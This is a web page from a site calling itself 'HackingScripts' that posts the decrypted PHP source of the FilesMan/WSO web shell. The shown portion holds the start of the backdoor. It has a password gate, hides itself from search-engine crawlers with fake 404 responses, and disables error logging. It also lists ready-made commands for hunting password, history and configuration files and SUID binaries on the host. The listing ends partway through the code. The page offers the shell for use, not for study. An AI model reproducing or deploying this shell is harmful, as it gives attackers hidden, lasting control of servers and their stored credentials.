<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> FilesMan Shell (decrypted) </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>FilesMan Shell (decrypted)</h2>
<p class="meta">09 Feb 2014</p>

<p>This is the decrypted version of the <a href="http://hackingscripts.com/filesman-shell-encrypted/" title="FilesMan Shell">encrypted FilesMan shell</a>.</p>

<h3>FilesMan Shell Source Code (decrypted)</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="c1">#v2.3      //Version</span>
<span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>    <span class="c1">//75b43eac8d215582f6bcab4532eb854e </span>
<span class="nv">$color</span> <span class="o">=</span> <span class="s2">&quot;#00FF66&quot;</span><span class="p">;</span> <span class="c1">//Colour</span>
<span class="nv">$default_action</span> <span class="o">=</span> <span class="s2">&quot;FilesMan&quot;</span><span class="p">;</span>
<span class="nv">$default_charset</span> <span class="o">=</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nv">$userAgents</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Google&quot;</span><span class="p">,</span> <span class="s2">&quot;Slurp&quot;</span><span class="p">,</span> <span class="s2">&quot;MSNBot&quot;</span><span class="p">,</span> <span class="s2">&quot;ia_archiver&quot;</span><span class="p">,</span> <span class="s2">&quot;Yandex&quot;</span><span class="p">,</span> <span class="s2">&quot;Rambler&quot;</span><span class="p">);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$userAgents</span> <span class="k">as</span> <span class="nv">$agent</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span> <span class="nv">$agent</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span>
            <span class="k">exit</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;2.3&#39;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">function</span> <span class="nf">WSOstripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;WSOstripslashes&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">WSOstripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">wsoLogin</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;form method=post&amp;gt;Password: &amp;lt;input type=password name=pass&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="p">))</span>
    <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="o">||</span>
        <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="nx">wsoLogin</span><span class="p">();</span>
 
<span class="k">if</span><span class="p">(</span> <span class="nb">strtolower</span><span class="p">(</span> <span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span> <span class="p">)</span>
    <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;win&#39;</span><span class="p">;</span>
<span class="k">else</span>
    <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;nix&#39;</span><span class="p">;</span>
<span class="nv">$safe_mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span>
<span class="nv">$disable_functions</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span>
<span class="nv">$home_cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span>
    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
<span class="nv">$cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span> <span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$home_cwd</span><span class="p">);</span>
    <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span> <span class="nv">$cwd</span><span class="p">[</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span>
    <span class="nv">$cwd</span> <span class="o">.=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
 
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span>
    <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s2">&quot;List Directory&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;dir&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find index.php in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find *config*.php in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Show active connections&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Show running services&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net start&quot;</span><span class="p">,</span>
        <span class="s2">&quot;User accounts&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net user&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Show computers&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net view&quot;</span><span class="p">,</span>
        <span class="s2">&quot;ARP Table&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;arp -a&quot;</span><span class="p">,</span>
        <span class="s2">&quot;IP Configuration&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ipconfig /all&quot;</span>
    <span class="p">);</span>
<span class="k">else</span>
    <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s2">&quot;List dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ls -lha&quot;</span><span class="p">,</span>
        <span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">,</span>
        <span class="s2">&quot;show opened ports&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all suid files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find suid files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all sgid files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find sgid files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find config.inc.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find config* files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find config* files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all writable folders and files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all writable folders and files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all service.pwd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find service.pwd files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all .htpasswd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find .htpasswd files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all .bash_history files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find .bash_history files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all .fetchmailrc files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Locate&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate httpd.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate vhosts.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate vhosts.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate proftpd.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate psybnc.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate my.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate my.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate admin.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;locate admin.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate cfg.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate cfg.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate conf.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate conf.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.dat files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.dat&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.inc files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.inc&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.inc.php&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.inc.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.default.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.default.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config* files &quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .conf files&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;locate &#39;.conf&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .pwd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.pwd&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .sql files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.sql&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .htpasswd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.htpasswd&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .bash_history files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.bash_history&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .mysql_history files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.mysql_history&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .fetchmailrc files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.fetchmailrc&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate backup files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate backup&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate dump files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate dump&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate priv files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate priv&quot;</span>
    <span class="p">);</span>
 
<span class="k">function</span> <span class="nf">wsoHeader</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]))</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;default_charset&#39;</span><span class="p">];</span>
    <span class="k">global</span> <span class="nv">$color</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&amp;lt;title&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;- WSO &quot;</span> <span class="o">.</span> <span class="nx">VERSION</span> <span class="o">.</span><span class="s2">&quot;&amp;lt;/title&amp;gt; </span>
<span class="s2">&amp;lt;style&amp;gt; </span>
<span class="s2">body{background-color:#444;color:#e1e1e1;}</span>
<span class="s2">body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }</span>
<span class="s2">table.info{ color:#fff;background-color:#222; }</span>
<span class="s2">span,h1,a{ color: </span><span class="si">$color</span><span class="s2"> !important; }</span>
<span class="s2">span{ font-weight: bolder; }</span>
<span class="s2">h1{ border-left:5px solid </span><span class="si">$color</span><span class="s2">;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }</span>
<span class="s2">div.content{ padding: 5px;margin-left:5px;background-color:#333; }</span>
<span class="s2">a{ text-decoration:none; }</span>
<span class="s2">a:hover{ text-decoration:underline; }</span>
<span class="s2">.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }</span>
<span class="s2">.bigarea{ width:100%;height:250px; }</span>
<span class="s2">input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid </span><span class="si">$color</span><span class="s2">; font: 9pt Monospace,&#39;Courier New&#39;; }</span>
<span class="s2">form{ margin:0px; }</span>
<span class="s2">#toolsTbl{ text-align:center; }</span>
<span class="s2">.toolsInp{ width: 300px }</span>
<span class="s2">.main th{text-align:left;background-color:#5e5e5e;}</span>
<span class="s2">.main tr:hover{background-color:#5e5e5e}</span>
<span class="s2">.l1{background-color:#444}</span>
<span class="s2">pre{font-family:Courier,Monospace;}</span>
<span class="s2">&amp;lt;/style&amp;gt; </span>
<span class="s2">&amp;lt;script&amp;gt; </span>
<span class="s2">    var c_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="s2">    var a_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;</span>
<span class="s2">    var charset_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var p1_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">addslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var p2_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">addslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var p3_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">addslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">   function set(a,c,p1,p2,p3,charset) {</span>
<span class="s2">       if(a != null)document.mf.a.value=a;else document.mf.a.value=a_;</span>
<span class="s2">       if(c != null)document.mf.c.value=c;else document.mf.c.value=c_;</span>
<span class="s2">       if(p1 != null)document.mf.p1.value=p1;else document.mf.p1.value=p1_;</span>
<span class="s2">       if(p2 != null)document.mf.p2.value=p2;else document.mf.p2.value=p2_;</span>
<span class="s2">       if(p3 != null)document.mf.p3.value=p3;else document.mf.p3.value=p3_;</span>
<span class="s2">       if(charset != null)document.mf.charset.value=charset;else document.mf.charset.value=charset_;</span>
<span class="s2">   }</span>
<span class="s2">   function g(a,c,p1,p2,p3,charset) {</span>
<span class="s2">       set(a,c,p1,p2,p3,charset);</span>
<span class="s2">       document.mf.submit();</span>
<span class="s2">   }</span>
<span class="s2">   function a(a,c,p1,p2,p3,charset) {</span>
<span class="s2">       set(a,c,p1,p2,p3,charset);</span>
<span class="s2">       var params = &#39;ajax=true&#39;;</span>
<span class="s2">       for(i=0;i&amp;lt;document.mf.elements.length;i++)</span>
<span class="s2">           params += &#39;&amp;&#39;+document.mf.elements[i].name+&#39;=&#39;+encodeURIComponent(document.mf.elements[i].value);</span>
<span class="s2">       sr(&#39;&quot;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;, params);</span>
<span class="s2">   }</span>
<span class="s2">   function sr(url, params) {</span>
<span class="s2">       if (window.XMLHttpRequest)</span>
<span class="s2">           req = new XMLHttpRequest();</span>
<span class="s2">       else if (window.ActiveXObject)</span>
<span class="s2">           req = new ActiveXObject(&#39;Microsoft.XMLHTTP&#39;);</span>
<span class="s2">        if (req) {</span>
<span class="s2">            req.onreadystatechange = processReqChange;</span>
<span class="s2">            req.open(&#39;POST&#39;, url, true);</span>
<span class="s2">            req.setRequestHeader (&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);</span>
<span class="s2">            req.send(params);</span>
<span class="s2">        }</span>
<span class="s2">   }</span>
<span class="s2">   function processReqChange() {</span>
<span class="s2">       if( (req.readyState == 4) )</span>
<span class="s2">           if(req.status == 200) {</span>
<span class="s2">               var reg = new RegExp(</span><span class="se">\&quot;</span><span class="s2">(</span><span class="se">\\\\</span><span class="s2">d+)([</span><span class="se">\\\\</span><span class="s2">S</span><span class="se">\\\\</span><span class="s2">s]*)</span><span class="se">\&quot;</span><span class="s2">, &#39;m&#39;);</span>
<span class="s2">               var arr=reg.exec(req.responseText);</span>
<span class="s2">               eval(arr[2].substr(0, arr[1]));</span>
<span class="s2">           } else alert(&#39;Request error!&#39;);</span>
<span class="s2">   }</span>
